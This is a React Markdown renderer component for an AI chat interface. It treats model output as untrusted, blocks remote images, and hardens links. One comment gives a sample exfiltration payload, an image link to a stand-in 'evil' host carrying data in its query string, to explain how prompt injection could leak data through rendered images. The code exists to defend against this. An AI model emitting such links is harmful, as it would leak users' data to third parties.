import { memo, useMemo } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import rehypeHighlight from 'rehype-highlight'
import remend from 'remend'
import RenderBoundary from './RenderBoundary'

/** Above this a reply is shown as plain text: parsing it per flush would stall the tab. */
export const MAX_RENDERED_CHARS = 200_000

interface MarkdownRendererProps {
  content: string
  /** True while tokens are still arriving: closes dangling `**`, links, etc. */
  streaming?: boolean
}

const REMARK_PLUGINS = [remarkGfm]
const REHYPE_PLUGINS: NonNullable<React.ComponentProps<typeof ReactMarkdown>['rehypePlugins']> = [
  [rehypeHighlight, { detect: false, ignoreMissing: true }],
]

function hostOf(src: string): string {
  try {
    return new URL(src).host || 'unknown source'
  } catch {
    return 'unknown source'
  }
}

/**
 * Model output is untrusted. Raw HTML is never rendered (react-markdown's
 * default) and unsafe URL schemes are blanked by its default URL transform.
 * Remote images are not fetched: a prompt-injected `![](https://evil/?d=...)`
 * would otherwise leak data to a third party, so the image is named instead.
 */
const COMPONENTS: Components = {
  a({ href, children }) {
    if (!href) return <span>{children}</span>
    return (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    )
  },
  img({ src, alt }) {
    const source = typeof src === 'string' ? src : ''
    return (
      <span className="md-blocked-image">
        Image not loaded{alt ? `: ${alt}` : ''} ({hostOf(source)})
      </span>
    )
  },
  table({ children }) {
    return (
      <div className="overflow-x-auto">
        <table>{children}</table>
      </div>
    )
  },
}

function PlainText({ content, notice }: { content: string; notice?: string }) {
  return (
    <div>
      {notice && <p className="mb-1 text-[11.5px] text-ink-subtle">{notice}</p>}
      <p className="whitespace-pre-wrap px-1 py-1 text-[13px] text-ink">{content}</p>
    </div>
  )
}

/**
 * Renders an assistant reply as GitHub-flavoured Markdown. A crash in the
 * renderer falls back to the original text, never to a blank or broken page.
 */
function MarkdownRenderer({ content, streaming = false }: MarkdownRendererProps) {
  const tooLong = content.length > MAX_RENDERED_CHARS
  const source = useMemo(
    () => (streaming && !tooLong ? remend(content) : content),
    [content, streaming, tooLong]
  )

  if (tooLong) {
    return <PlainText content={content} notice="This reply is too long to format, so it is shown as plain text." />
  }

  return (
    <RenderBoundary fallback={<PlainText content={content} />}>
      <div className="md-body">
        <ReactMarkdown
          remarkPlugins={REMARK_PLUGINS}
          rehypePlugins={REHYPE_PLUGINS}
          components={COMPONENTS}
        >
          {source}
        </ReactMarkdown>
      </div>
    </RenderBoundary>
  )
}

export default memo(MarkdownRenderer)
